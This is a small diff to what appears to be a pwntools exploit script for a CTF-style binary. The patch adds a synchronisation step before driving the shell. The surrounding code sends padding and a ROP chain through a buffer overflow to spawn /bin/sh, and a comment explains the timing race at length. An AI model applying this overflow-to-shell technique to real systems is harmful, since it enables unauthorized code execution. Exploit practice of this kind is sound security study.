@@ -49,6 +49,17 @@ def _one_shot() -> bool:
         io.recvuntil(b'name? ', timeout=5)
         io.send(cyclic(72) + chain + b'\n')
 
+        # Synchronise before driving the shell.  The target's overflow is a
+        # single greedy `read(0, name, 512)`; it returns as soon as data is
+        # available and then prints the "hello, ..." echo *before* the ROP
+        # chain runs `system("/bin/sh")`.  If we fire the `echo` command
+        # immediately, both writes can land in the pipe before the target's
+        # read() is scheduled, so that one read() swallows the follow-up
+        # command too and the spawned shell never sees it.  Waiting for the
+        # "hello, ..." line proves read() has already consumed exactly the
+        # payload, so the next write is delivered to the shell's stdin.
+        io.recvline(timeout=5)
+
         # If we won, we now have `/bin/sh` on the pipe.  Confirm by echoing
         # a unique token and reading it back.
         io.sendline(f'echo {TAG}'.encode())
